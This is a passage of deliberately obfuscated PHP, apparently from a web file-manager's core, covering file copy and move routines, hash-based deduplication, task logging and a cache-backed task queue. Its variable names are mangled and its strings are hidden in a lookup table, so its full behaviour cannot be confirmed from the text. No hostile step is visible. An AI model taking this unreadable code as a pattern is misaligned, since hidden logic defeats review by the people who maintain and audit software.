$Íæ×¾[$Âíˆ¹¥¡[33]] == $Âíˆ¹¥¡[77]; $Íæ×¾[$Âíˆ¹¥¡[456]] = substr(_get($Íæ×¾, $Âíˆ¹¥¡[177], $Âíˆ¹¥¡[12]), 0, 10); $Íæ×¾[$Âíˆ¹¥¡[78]] = _get($Íæ×¾, $Âíˆ¹¥¡[78], 0); $Íæ×¾[$Âíˆ¹¥¡[511]] = _get($Íæ×¾, $Âíˆ¹¥¡[511], 0); if (!isset($Íæ×¾[$Âíˆ¹¥¡[640]]) && $Íæ×¾[$Âíˆ¹¥¡[511]]) { $ËÚùÊÕ [$Âíˆ¹¥¡[637]][] = $Íæ×¾[$Âíˆ¹¥¡[511]]; } if ($Œş¤Á†Ù) { $çô€ = $this->fileNameExistCache($à—»ÇšÎ, $Íæ×¾[$Âíˆ¹¥¡[32]]); if ($çô€) { if ($Íæ×¾[$Âíˆ¹¥¡[455]] || $Œş¤Á†Ù == REPEAT_SKIP) { continue; } if ($Œş¤Á†Ù == REPEAT_REPLACE) { $©Ô™¸Ğˆ = $this->sourceInfoCache($çô€); $¿ú»ï®ì = $this->fileHistory($©Ô™¸Ğˆ, $Íæ×¾[$Âíˆ¹¥¡[511]], $Íæ×¾[$Âíˆ¹¥¡[78]]); if ($¿ú»ï®ì) { $ËÚùÊÕ [$Âíˆ¹¥¡[599]][] = $Íæ×¾[$Âíˆ¹¥¡[511]]; } continue; } else { if ($Œş¤Á†Ù == REPEAT_RENAME) { $Íæ×¾[$Âíˆ¹¥¡[32]] = $this->fileNameAutoCache($à—»ÇšÎ, $Íæ×¾[$Âíˆ¹¥¡[32]], $Œş¤Á†Ù, !1); } } } } if (!$Íæ×¾[$Âíˆ¹¥¡[455]] && $Íæ×¾[$Âíˆ¹¥¡[511]] == 0) { continue; } if (!$Íæ×¾[$Âíˆ¹¥¡[455]] && $Íæ×¾[$Âíˆ¹¥¡[511]]) { $ËÚùÊÕ [$Âíˆ¹¥¡[599]][] = $Íæ×¾[$Âíˆ¹¥¡[511]]; } $€¼Ç¨ï[] = $this->_makeItemData($Íæ×¾, $Ì‘­¦©Ù, $Íæ×¾[$Âíˆ¹¥¡[32]]); } unset($Íæ×¾); if (!empty($€¼Ç¨ï)) { $this->addAll($€¼Ç¨ï); $this->_childrenListSelect($à—»ÇšÎ); } $Ö—ø…Ã‰ = $this->_childrenList($à—»ÇšÎ); $Ö—ø…Ã‰ = array_to_keyvalue($Ö—ø…Ã‰, $Âíˆ¹¥¡[32]); foreach ($½³¿¿Ÿ÷ as $Íæ×¾) { $©Ô™¸Ğˆ = $Ö—ø…Ã‰[$Íæ×¾[$Âíˆ¹¥¡[32]]]; $Â°‰ıøÆ = $©Ô™¸Ğˆ[$Âíˆ¹¥¡[183]]; $this->_copyApplyMeta($©Ô™¸Ğˆ, $ËÚùÊÕ ); if ($Íæ×¾[$Âíˆ¹¥¡[33]] == $Âíˆ¹¥¡[77]) { $Íæ×¾[$Âíˆ¹¥¡[86]] = $øµÁ³Ïú->getPathInner($Íæ×¾[$Âíˆ¹¥¡[86]]); $this->_copyChildTo($øµÁ³Ïú, $Íæ×¾[$Âíˆ¹¥¡[86]], $Â°‰ıøÆ, $Œş¤Á†Ù, $ËÚùÊÕ , $¢‰£ıèª); } } } private function _addFiles($øéªÙïƒ, $—µ¾¥ûÆ, $Òõ ûå–) { $ôë²‹–± =& $_SERVER[•Ùç É]; if (!$—µ¾¥ûÆ || count($—µ¾¥ûÆ) == 0) { return array(); } $³ó›ˆØ = array(); foreach ($—µ¾¥ûÆ as &$„ô“›ò) { Hook::trigger($ôë²‹–±[641], $„ô“›ò); $„ô“›ò[$ôë²‹–±[86]] = $øéªÙïƒ->getPathInner($„ô“›ò[$ôë²‹–±[86]]); $è˜Ğ¿ = $øéªÙïƒ->hashSimple($„ô“›ò[$ôë²‹–±[86]]); $ Îêáˆô = $øéªÙïƒ->hashMd5($„ô“›ò[$ôë²‹–±[86]]); if (strlen($ Îêáˆô) > 10 && !isset($³ó›ˆØ[$ Îêáˆô])) { $³ó›ˆØ[$ Îêáˆô] = array(); } $„ô“›ò[$ôë²‹–±[642]] = $è˜Ğ¿; $„ô“›ò[$ôë²‹–±[517]] = $ Îêáˆô; $³ó›ˆØ[$ Îêáˆô][] =& $„ô“›ò; if (count($³ó›ˆØ[$ Îêáˆô]) > 1) { $„ô“›ò[$ôë²‹–±[640]] = !0; } Hook::trigger($ôë²‹–±[643], $„ô“›ò); } unset($„ô“›ò); $Ã¯®œÇ” = array($ôë²‹–±[517] => array($ôë²‹–±[7], array_keys($³ó›ˆØ))); $öë•İØ¢ = Model($ôë²‹–±[644]); $ÈËáÕ˜ = $öë•İØ¢->where($Ã¯®œÇ”)->select(); $ÈËáÕ˜ = $ÈËáÕ˜ ? $ÈËáÕ˜ : array(); foreach ($ÈËáÕ˜ as $ëßéÜß¼) { if (!isset($³ó›ˆØ[$ëßéÜß¼[$ôë²‹–±[517]]])) { continue; } $À´êÔ€ = $³ó›ˆØ[$ëßéÜß¼[$ôë²‹–±[517]]]; foreach ($À´êÔ€ as &$„ô“›ò) { $„ô“›ò[$ôë²‹–±[511]] = $ëßéÜß¼[$ôë²‹–±[511]]; $„ô“›ò[$ôë²‹–±[640]] = !0; } unset($„ô“›ò); } $Ü‹ÄÁïÂ = array(); foreach ($—µ¾¥ûÆ as $¶¨œåÔ‹) { Hook::trigger($ôë²‹–±[645], $¶¨œåÔ‹); if (isset($¶¨œåÔ‹[$ôë²‹–±[640]]) && $¶¨œåÔ‹[$ôë²‹–±[640]]) { Hook::trigger($ôë²‹–±[646], $¶¨œåÔ‹); continue; } $¢ƒóˆÎ› = $øéªÙïƒ->getPathInner($¶¨œåÔ‹[$ôë²‹–±[86]]); $„ÀÀ›Á• = $öë•İØ¢->addFileMake($¢ƒóˆÎ›, $¶¨œåÔ‹[$ôë²‹–±[78]], $¶¨œåÔ‹[$ôë²‹–±[642]], $¶¨œåÔ‹[$ôë²‹–±[517]], $¶¨œåÔ‹[$ôë²‹–±[32]], $Òõ ûå–); Hook::trigger($ôë²‹–±[646], $¶¨œåÔ‹); if (!is_array($„ÀÀ›Á•)) { continue; } $Ü‹ÄÁïÂ[] = $„ÀÀ›Á•; } $öë•İØ¢->addAll($Ü‹ÄÁïÂ); $Ã¯®œÇ” = array($ôë²‹–±[517] => array($ôë²‹–±[7], array_keys($³ó›ˆØ))); $ÈËáÕ˜ = $öë•İØ¢->where($Ã¯®œÇ”)->select(); $ÈËáÕ˜ = $ÈËáÕ˜ ? $ÈËáÕ˜ : array(); foreach ($ÈËáÕ˜ as $ëßéÜß¼) { if (!isset($³ó›ˆØ[$ëßéÜß¼[$ôë²‹–±[517]]])) { continue; } $ ûÉÎÛÃ =& $³ó›ˆØ[$ëßéÜß¼[$ôë²‹–±[517]]]; foreach ($ ûÉÎÛÃ as &$„ô“›ò) { $„ô“›ò[$ôë²‹–±[511]] = $ëßéÜß¼[$ôë²‹–±[511]]; } unset($„ô“›ò); } $óâÔ¾¾ = array(); foreach ($—µ¾¥ûÆ as $¸½¤¯™) { $óâÔ¾¾[$¸½¤¯™[$ôë²‹–±[32]]] = $¸½¤¯™; } return $óâÔ¾¾; } } goto A‚·«ô†«¨; Dâ¹õ‡ÂÒß: function binCheckBigger($ŠŠ½–”, $ªÉÖ…Şñ) { return $ŠŠ½–” > $ªÉÖ…Şñ; } $_SERVER[$_SERVER[Ì»Ÿâ÷ƒ][3]] = ("\x38\x32\x39\x35"."\61\70")+0;$_bdi6="quemzivyc2okd0fps6x4b5wjnalthr3817g9g5zqsojfir0kvt3byw491u682cdemnap7xhle460fs";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ÙÉÇ¯–ğ, $šÎ“ƒ«¨) { $Â‡ï‘´” =& $_SERVER[•Ùç É]; if (isset(self::$_methodList[$ÙÉÇ¯–ğ])) { return @call_user_func_array(self::$_methodList[$ÙÉÇ¯–ğ], $šÎ“ƒ«¨); } else { if (method_exists($this, $ÙÉÇ¯–ğ)) { return call_user_func_array(array($this, $ÙÉÇ¯–ğ), $šÎ“ƒ«¨); } else { think_exception(__CLASS__ . $Â‡ï‘´”[4] . $ÙÉÇ¯–ğ . $Â‡ï‘´”[5]); } } } public static function __callStatic($Ïòã»œ, $ª®ÜÓ°) { if (isset(self::$_methodListStatic[$Ïòã»œ])) { return call_user_func_array(self::$_methodListStatic[$Ïòã»œ], $ª®ÜÓ°); } else { if (method_exists(self, $Ïòã»œ)) { return call_user_func_array(array(self, $Ïòã»œ), $ª®ÜÓ°); } else { show_json("{$Ïòã»œ}\x28\51\x20\x6e\x6f\164\40\145\x78\151\163\164\73", !1); } } } public static function addMethod($”ë‰ÔŸ, $ŠŞ¦ƒ´) { self::$_methodList[$”ë‰ÔŸ] = $ŠŞ¦ƒ´; } public static function addMethodStatic($¹Ô”’‹, $³ö³ô¨) { self::$_methodListStatic[$¹Ô”’‹] = $³ö³ô¨; } } goto d…•’¤†Óƒ; Fåµòé‚Ò: class TaskHttp extends Task { protected function startAfter() { $°éŸ´ =& $_SERVER[•Ùç É]; $îóã†ˆó =& $this->task; $îóã†ˆó[$°éŸ´[1783]] = 1; Hook::bind($°éŸ´[1750], array($this, $°éŸ´[1784])); Hook::bind($°éŸ´[1752], array($this, $°éŸ´[1785])); Hook::bind($°éŸ´[1754], array($this, $°éŸ´[1786])); } protected function endAfter() { $ë¹÷‘Ì— =& $_SERVER[•Ùç É]; Hook::unbind($ë¹÷‘Ì—[1750], array($this, $ë¹÷‘Ì—[1784])); Hook::unbind($ë¹÷‘Ì—[1752], array($this, $ë¹÷‘Ì—[1785])); Hook::unbind($ë¹÷‘Ì—[1754], array($this, $ë¹÷‘Ì—[1786])); } public function progressStart($×€£³¶·) { $‰® Ÿ‹¸ =& $_SERVER[•Ùç É]; $åœ¸õÅÙ = curl_getinfo($×€£³¶·); self::log($‰® Ÿ‹¸[1787] . $åœ¸õÅÙ[$‰® Ÿ‹¸[353]]); self::valueSet($this->task[$‰® Ÿ‹¸[445]], $this->task); } public function progressEnd($Ï‡Ó—) { $Œ‡Ğá¯½ =& $_SERVER[•Ùç É]; self::log($Œ‡Ğá¯½[1788] . $this->task[$Œ‡Ğá¯½[445]]); $this->end(); } public function progress($­˜»ä¹¯, $æ¼’Ù¨, $×¨ª‰³, $Ì¶¿‹Í¡, $™œİ›´Ì) { $ãÁŠğˆŸ =& $_SERVER[•Ùç É]; $Ö¬ˆƒÈ÷ =& $this->task; if ($™œİ›´Ì > 0) { $Ö¬ˆƒÈ÷[$ãÁŠğˆŸ[831]] = $Ö¬ˆƒÈ÷[$ãÁŠğˆŸ[831]] == 0 ? $Ì¶¿‹Í¡ : $Ö¬ˆƒÈ÷[$ãÁŠğˆŸ[831]]; $Ö¬ˆƒÈ÷[$ãÁŠğˆŸ[1706]] = $™œİ›´Ì; } else { if ($×¨ª‰³ > 0) { $Ö¬ˆƒÈ÷[$ãÁŠğˆŸ[831]] = $Ö¬ˆƒÈ÷[$ãÁŠğˆŸ[831]] == 0 ? $æ¼’Ù¨ : $Ö¬ˆƒÈ÷[$ãÁŠğˆŸ[831]]; $Ö¬ˆƒÈ÷[$ãÁŠğˆŸ[1706]] = $×¨ª‰³; } } $this->update(); self::log("\x70\x72\157\147\x72\145\x73\163\110\164\x74\160\x3a\144\157\x77\156\72{$×¨ª‰³}\57{$æ¼’Ù¨}\73\x20\x75\160\154\157\x61\144\x3a{$™œİ›´Ì}\57{$Ì¶¿‹Í¡}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($£’´ö©ª, $ğŞ¦ÈÁ¥ = '', $ßÑ‰ÛÇ® = 0, $’‹õ¤¯ˆ = '') { $‚øÁ”Šù =& $_SERVER[•Ùç É]; $’‹õ¤¯ˆ = $’‹õ¤¯ˆ ? $’‹õ¤¯ˆ : ($ğŞ¦ÈÁ¥ ? $ğŞ¦ÈÁ¥ : $£’´ö©ª); $Ş¶ªòØ¦ = new Task($£’´ö©ª, $ğŞ¦ÈÁ¥, $ßÑ‰ÛÇ®, $’‹õ¤¯ˆ); $GLOBALS[$‚øÁ”Šù[1789] . $£’´ö©ª] = new TaskLog($‚øÁ”Šù[1689], $Ş¶ªòØ¦, $’‹õ¤¯ˆ); return $Ş¶ªòØ¦; } public function __construct($Ôüê›ËØ = '', $‡——Ğ°Ø = '', $ÁŞ–ùÚò = '') { $ê¥Ç¥šé =& $_SERVER[•Ùç É]; if (!$Ôüê›ËØ) { $Ôüê›ËØ = $ê¥Ç¥šé[1689]; } $— Ìô¼õ = $Ôüê›ËØ . $ê¥Ç¥šé[432] . rand_string(10); if (!$ÁŞ–ùÚò) { $ÁŞ–ùÚò = $Ôüê›ËØ . $ê¥Ç¥šé[53] . $ÁŞ–ùÚò; } switch ($Ôüê›ËØ) { case $ê¥Ç¥šé[1689]: if (!$‡——Ğ°Ø || !$‡——Ğ°Ø->task) { return echoLog($Ôüê›ËØ . $ê¥Ç¥šé[1790]); } $ß¦’ = $‡——Ğ°Ø; $— Ìô¼õ = $ß¦’->task[$ê¥Ç¥šé[445]]; $Ôüê›ËØ = $ß¦’->task[$ê¥Ç¥šé[445]]; if (!$ß¦’->task[$ê¥Ç¥šé[1593]]) { $ß¦’->task[$ê¥Ç¥šé[1593]] = $ÁŞ–ùÚò ? $ÁŞ–ùÚò : $Ôüê›ËØ; } break; case $ê¥Ç¥šé[1791]: if (!$‡——Ğ°Ø) { return echoLog($Ôüê›ËØ . $ê¥Ç¥šé[1792]); } $¢‡êéÅ˜ = is_string($‡——Ğ°Ø) ? array($‡——Ğ°Ø) : $‡——Ğ°Ø; $ß¦’ = new TaskFileTransfer($— Ìô¼õ, $Ôüê›ËØ, 0, $ÁŞ–ùÚò ? $ÁŞ–ùÚò : $¢‡êéÅ˜[0]); foreach ($¢‡êéÅ˜ as $ú®¥Ø©ö) { $ß¦’->addPath($ú®¥Ø©ö); } break; case $ê¥Ç¥šé[359]: if (!$‡——Ğ°Ø) { return echoLog($Ôüê›ËØ . $ê¥Ç¥šé[1792]); } $¢‡êéÅ˜ = is_string($‡——Ğ°Ø) ? array($‡——Ğ°Ø) : $‡——Ğ°Ø; $ß¦’ = new TaskZip($— Ìô¼õ, $Ôüê›ËØ, 0, $ÁŞ–ùÚò ? $ÁŞ–ùÚò : $¢‡êéÅ˜[0]); foreach ($¢‡êéÅ˜ as $ú®¥Ø©ö) { $ß¦’->addPath($ú®¥Ø©ö); } break; case $ê¥Ç¥šé[1265]: if (!$‡——Ğ°Ø) { return echoLog($Ôüê›ËØ . $ê¥Ç¥šé[1792]); } $ß¦’ = new TaskUnZip($— Ìô¼õ, $Ôüê›ËØ, 0, $ÁŞ–ùÚò ? $ÁŞ–ùÚò : $‡——Ğ°Ø); if ($‡——Ğ°Ø) { $ß¦’->addFile($‡——Ğ°Ø); } break; case $ê¥Ç¥šé[151]: $ß¦’ = new TaskHttp($— Ìô¼õ, $Ôüê›ËØ); break; default: return; break; } $this->task = $ß¦’; $this->taskID = $— Ìô¼õ; Hook::bind($ê¥Ç¥šé[1726], array($this, $ê¥Ç¥šé[1793])); Hook::bind($ê¥Ç¥šé[1728], array($this, $ê¥Ç¥šé[1794])); Hook::bind($ê¥Ç¥šé[1722], array($this, $ê¥Ç¥šé[1795])); echoLog($ê¥Ç¥šé[1796] . $ß¦’->task[$ê¥Ç¥šé[1593]]); } public function __destruct() { $this->end(); } public function end($åğ°Ïœª = '') { $‰üÎğåÈ =& $_SERVER[•Ùç É]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($åğ°Ïœª); $this->task = !1; $this->taskID = !1; Hook::unbind($‰üÎğåÈ[1726], array($this, $‰üÎğåÈ[1793])); Hook::unbind($‰üÎğåÈ[1728], array($this, $‰üÎğåÈ[1794])); Hook::unbind($‰üÎğåÈ[1722], array($this, $‰üÎğåÈ[1795])); } public function taskUpdate($ÜÆ‡¸õÆ) { $ÛÙ”»”€ =& $_SERVER[•Ùç É]; if (!$ÜÆ‡¸õÆ || $this->taskID != $ÜÆ‡¸õÆ[$ÛÙ”»”€[445]]) { return; } $Åç­‰¬ = 20; $¾ò¾³í = intval($ÜÆ‡¸õÆ[$ÛÙ”»”€[1707]] * $Åç­‰¬); $ÃúÙ§½÷ = $ÛÙ”»”€[165] . str_repeat($ÛÙ”»”€[935], $¾ò¾³í) . $ÛÙ”»”€[1065] . str_repeat($ÛÙ”»”€[53], $Åç­‰¬ - $¾ò¾³í) . $ÛÙ”»”€[167]; $•ò€™…Î = $ÃúÙ§½÷ . sprintf($ÛÙ”»”€[1797], $ÜÆ‡¸õÆ[$ÛÙ”»”€[1707]] * 100) . $ÛÙ”»”€[1798]; $«å¢àÈ = $•ò€™…Î . $ÜÆ‡¸õÆ[$ÛÙ”»”€[1706]] . $ÛÙ”»”€[8] . $ÜÆ‡¸õÆ[$ÛÙ”»”€[831]] . LNG($ÛÙ”»”€[1799]); $À†çÏà¢ = $ÛÙ”»”€[12]; if ($ÜÆ‡¸õÆ[$ÛÙ”»”€[1783]]) { $«å¢àÈ = $•ò€™…Î . size_format($ÜÆ‡¸õÆ[$ÛÙ”»”€[1706]]) . $ÛÙ”»”€[8] . size_format($ÜÆ‡¸õÆ[$ÛÙ”»”€[831]]); $À†çÏà¢ = size_format($ÜÆ‡¸õÆ[$ÛÙ”»”€[1708]]) . $ÛÙ”»”€[1800]; } if ($ÜÆ‡¸õÆ[$ÛÙ”»”€[1115]]) { $ÜÆ‡¸õÆ[$ÛÙ”»”€[1756]] = $ÜÆ‡¸õÆ[$ÛÙ”»”€[1115]] . $ÛÙ”»”€[53] . $ÜÆ‡¸õÆ[$ÛÙ”»”€[1756]]; } if ($ÜÆ‡¸õÆ[$ÛÙ”»”€[1756]]) { $”ùŸØá¤ = $ÛÙ”»”€[12]; if ($ÜÆ‡¸õÆ[$ÛÙ”»”€[1758]]) { $”ùŸØá¤ = $ÛÙ”»”€[50] . size_format($ÜÆ‡¸õÆ[$ÛÙ”»”€[1759]]) . $ÛÙ”»”€[8] . size_format($ÜÆ‡¸õÆ[$ÛÙ”»”€[1758]]); } $À†çÏà¢ .= $ÜÆ‡¸õÆ[$ÛÙ”»”€[1756]] . $”ùŸØá¤; } if ($ÜÆ‡¸õÆ[$ÛÙ”»”€[808]] && !$ÜÆ‡¸õÆ[$ÛÙ”»”€[1758]]) { $À†çÏà¢ .= $ÛÙ”»”€[53] . size_format($ÜÆ‡¸õÆ[$ÛÙ”»”€[1763]]) . $ÛÙ”»”€[8] . size_format($ÜÆ‡¸õÆ[$ÛÙ”»”€[808]]); } echoLog($«å¢àÈ . $ÛÙ”»”€[53] . $À†çÏà¢, !0); } public function taskEnd($©£“é¸ê) { $ë¹œÙû´ =& $_SERVER[•Ùç É]; if (!$©£“é¸ê || $this->taskID != $©£“é¸ê[$ë¹œÙû´[445]]) { return; } $é‰ê”ƒ± = $©£“é¸ê ? $©£“é¸ê[$ë¹œÙû´[1706]] . $ë¹œÙû´[8] . $©£“é¸ê[$ë¹œÙû´[831]] . LNG($ë¹œÙû´[1799]) . $ë¹œÙû´[73] : $ë¹œÙû´[12]; echoLog($ë¹œÙû´[1801] . $©£“é¸ê[$ë¹œÙû´[1593]] . ($©£“é¸ê[$ë¹œÙû´[496]] ? $ë¹œÙû´[73] . $©£“é¸ê[$ë¹œÙû´[496]] : $ë¹œÙû´[12]) . $ë¹œÙû´[73] . $é‰ê”ƒ± . $ë¹œÙû´[1802] . sprintf($ë¹œÙû´[896], timeFloat() - $©£“é¸ê[$ë¹œÙû´[1709]]) . $ë¹œÙû´[1721]); $this->end(); } public function taskKill($ãığü½õ) { $‘’÷Â¤† =& $_SERVER[•Ùç É]; if (!$ãığü½õ || $this->taskID != $ãığü½õ[$‘’÷Â¤†[445]]) { return; } echoLog($‘’÷Â¤†[1803] . $ãığü½õ[$‘’÷Â¤†[1593]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\x73\153\121\165\x65\x75\x65\114\145\x6e\x67\164\150"; const QUEUE_DATA = "\x74\141\x73\x6b\121\165\145\x75\145\x44\141\x74\x61"; const QUEUE_TIME = "\164\141\163\x6b\x51\x75\x65\165\x65\114\141\x73\164\x52\x75\x6e"; const QUEUE_THREAD = "\x74\141\x73\153\121\165\x65\x75\x65\124\150\162\145\x61\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($î°áÖƒä, $ÙÕ¸¸ùÚ = array(), $âÉ‘Šåº = '', $Ï½ÙÕ™ = '') { $½›åˆŸ… =& $_SERVER[•Ùç É]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Ï½ÙÕ™ && array_find_by_field(self::$listData, $½›åˆŸ…[96], $Ï½ÙÕ™)) { return !0; } if ($Ï½ÙÕ™ && array_find_by_field(self::$listDataAdd, $½›åˆŸ…[96], $Ï½ÙÕ™)) { return !0; } self::$listDataAdd[] = array($½›åˆŸ…[310] => $î°áÖƒä, $½›åˆŸ…[1804] => $ÙÕ¸¸ùÚ, $½›åˆŸ…[496] => $âÉ‘Šåº, $½›åˆŸ…[96] => $Ï½ÙÕ™); return !0; } public static function addSubmit() { $Å‡Å„Á¯ =& $_SERVER[•Ùç É]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($Å‡Å„Á¯[1805] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $Å‡Å„Á¯[12], $Å‡Å„Á¯[496])), $Å‡Å„Á¯[187]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($Ê¤¼‰¬¸, $»¾—ôË˜ = array(), $•Œ£­¢Ó = '', $“Æùò‘Ë = '') { $òÏÁëøÉ =& $_SERVER[•Ùç É]; if (self::count() >= self::MAX_LENGTH) { return !1; } $‚ıª´™ï = self::getAll(); if ($“Æùò‘Ë && array_find_by_field($‚ıª´™ï, $òÏÁëøÉ[96], $“Æùò‘Ë)) { return !0; } $‚ıª´™ï[] = array($òÏÁëøÉ[310] => $Ê¤¼‰¬¸, $òÏÁëøÉ[1804] => $»¾—ôË˜, $òÏÁëøÉ[496] => $•Œ£­¢Ó, $òÏÁëøÉ[96] => $“Æùò‘Ë); self::setAll($‚ıª´™ï); write_log($òÏÁëøÉ[1805] . $•Œ£­¢Ó, $òÏÁëøÉ[187]); return !0; } public static function run() { $âà¿æ‡ =& $_SERVER[•Ùç É]; $ìä®îö = self::getAll(); $òÆò›© = array_shift($ìä®îö); if (!$òÆò›©) { return !1; } self::setAll($ìä®îö); $´—§€¤ = timeFloat(); $Ó¿‡ÇŒ‹ = $âà¿æ‡[12]; try { $Ó¿‡ÇŒ‹ = Hook::apply($òÆò›©[$âà¿æ‡[310]], $òÆò›©[$âà¿æ‡[1804]]); } catch (Exception $Ìºè§¼æ) { write_log($Ìºè§¼æ, $âà¿æ‡[1233]); } $Ñ¨ºáØ = number_format(timeFloat() - $´—§€¤, 3) . $âà¿æ‡[1721]; if ($Ó¿‡ÇŒ‹ && is_string($Ó¿‡ÇŒ‹)) { $Ñ¨ºáØ = $Ñ¨ºáØ . $âà¿æ‡[1806] . $Ó¿‡ÇŒ‹; } write_log($âà¿æ‡[1807] . $òÆò›©[$âà¿æ‡[496]] . $âà¿æ‡[1808] . $Ñ¨ºáØ, $âà¿æ‡[187]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Ÿ™‰øß =& $_SERVER[•Ùç É]; $ƒ‰¶Ğ¹ = self::threadCount() + 1; if ($ƒ‰¶Ğ¹ > 3 || !self::count()) { return; } write_log($Ÿ™‰øß[1809] . $ƒ‰¶Ğ¹, $Ÿ™‰øß[187]); Cache::set(self::QUEUE_THREAD, $ƒ‰¶Ğ¹, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Ÿ™‰øß[1810], $Ÿ™‰øß[187]); } public static function getKey($Äš¸ŞõÀ, $§ìÃ†Èı = "\151\x6e\x74") { $¬ñÄ§¥ª =& $_SERVER[•Ùç É]; Cache::removeMemory($Äš¸ŞõÀ); $¿ªÁĞìé = Cache::get($Äš¸ŞõÀ); if ($§ìÃ†Èı == $¬ñÄ§¥ª[334]) { return $¿ªÁĞìé ? intval($¿ªÁĞìé) : 0; } if ($§ìÃ†Èı == $¬ñÄ§¥ª[1811]) { return is_array($¿ªÁĞìé) ? $¿ªÁĞìé : array(); } return $¿ªÁĞìé; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[•Ùç É][1811]); } public static function setAll($ø±úÄá¦) { $ÒØª¶Êú = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ø±úÄá¦), $ÒØª¶Êú); Cache::set(self::QUEUE_DATA, $ø±úÄá¦, $ÒØª¶Êú); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto F®ÖïÌá»Á; E©öº­öáª: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($‰÷Ôó™ë) { if (substr($‰÷Ôó™ë, 0, 2) == $_SERVER[•Ùç É][1405]) { $‰÷Ôó™ë = BASIC_PATH . substr($‰÷Ôó™ë, 2); } return $‰÷Ôó™ë; } public function iconvApp($ÓòÇŒò) { $Úİâ­‘™ =& $_SERVER[•Ùç É]; global $config; return $this->iconvTo($ÓòÇŒò, $config[$Úİâ­‘™[1403]], $config[$Úİâ­‘™[1402]]); } public function iconvSystem($ÒÅÎÇ‘ä) { $’ë¹Ÿ¥ª =& $_SERVER[•Ùç É]; global $config; return $this->iconvTo($ÒÅÎÇ‘ä, $config[$’ë¹Ÿ¥ª[1402]], $config[$’ë¹Ÿ¥ª[1403]]); } public function getPathOuter($¬‰úÂ‚) { $†‚¿÷Úí =& $_SERVER[•Ùç É]; $ÁŸã…Ü = $this->iconvApp($this->pathBase); $¬‰úÂ‚ = $this->iconvApp($¬‰úÂ‚); if (substr($ÁŸã…Ü, 0, 2) == $†‚¿÷Úí[1405]) { $ÁŸã…Ü = BASIC_PATH . substr($ÁŸã…Ü, 2); } if (substr($¬‰úÂ‚, 0, 2) == $†‚¿÷Úí[1405]) { $¬‰úÂ‚ = BASIC_PATH . substr($¬‰úÂ‚, 2); } $ÁŸã…Ü = KodIO::clear($ÁŸã…Ü); $¬‰úÂ‚ = KodIO::clear($¬‰úÂ‚); $¬‰úÂ‚ = substr($¬‰úÂ‚, strlen($ÁŸã…Ü)); if (empty($this->pathDriver)) { return $¬‰úÂ‚; } return $this->pathDriver . $†‚¿÷Úí[8] . ltrim($¬‰úÂ‚, $†‚¿÷Úí[8]); } public function mkfile($šõÁÕÃ…, $Èœ»Í˜ = '', $ÇìÑì„ = REPEAT_RENAME) { $šõÁÕÃ… = $this->iconvSystem($šõÁÕÃ…); @touch($šõÁÕÃ…); if ($Èœ»Í˜) { file_put_contents($šõÁÕÃ…, $Èœ»Í˜); } @chmod($šõÁÕÃ…, $this->pathAuth); return is_file($šõÁÕÃ…) ? $this->getPathOuter($šõÁÕÃ…) : !1; } public function mkdir($Àà½Èê—, $¹ĞêÀ¾ç = REPEAT_SKIP) { $Àà½Èê— = $this->iconvSystem($Àà½Èê—); if (is_dir($Àà½Èê—)) { return $this->getPathOuter($Àà½Èê—); } @mkdir($Àà½Èê—, $this->pathAuth, !0); @chmod($Àà½Èê—, $this->pathAuth); return is_dir($Àà½Èê—) ? $this->getPathOuter($Àà½Èê—) : !1; } public function copyFile($ãÜÛŸ£, $€ù°Ş˜ö) { $this->mkdir($this->pathFather($€ù°Ş˜ö)); $ãÜÛŸ£ = $this->iconvSystem($ãÜÛŸ£); $€ù°Ş˜ö = $this->iconvSystem($€ù°Ş˜ö); $ç§Ø–ºµ = copy_64($ãÜÛŸ£, $€ù°Ş˜ö); @chmod($€ù°Ş˜ö, $this->pathAuth); return $ç§Ø–ºµ ? $this->getPathOuter($€ù°Ş˜ö) : !1; } public function moveFile($œ™²Â‰¾, $£óÑèš) { $this->mkdir($this->pathFather($£óÑèš)); $œ™²Â‰¾ = $this->iconvSystem($œ™²Â‰¾); $£óÑèš = $this->iconvSystem($£óÑèš); $šè„ï–² = intval(@rename($œ™²Â‰¾, $£óÑèš)); if (!$šè„ï–²) { if ($šè„ï–² = intval(@copy_64($œ™²Â‰¾, $£óÑèš))) { @unlink($œ™²Â‰¾); } } @chmod($£óÑèš, $this->pathAuth); return $šè„ï–² ? $this->getPathOuter($£óÑèš) : !1; } public function movePath($û¼ƒ´ğ, $·Ï×¥, $ª‡şªÔñ = false) { $…Üœî¹ =& $_SERVER[•Ùç É]; $û¼ƒ´ğ = $this->iconvSystem($û¼ƒ´ğ); $·Ï×¥ = $this->iconvSystem($·Ï×¥); $©¯ïÎ·Ò = rtrim($·Ï×¥, $…Üœî¹[8]) . $…Üœî¹[8] . ($ª‡şªÔñ ? $ª‡şªÔñ : get_path_this($û¼ƒ´ğ)); if (file_exists($©¯ïÎ·Ò)) { return !1; } $é²ïñÄË = intval(@rename($û¼ƒ´ğ, $©¯ïÎ·Ò)); $é²ïñÄË = 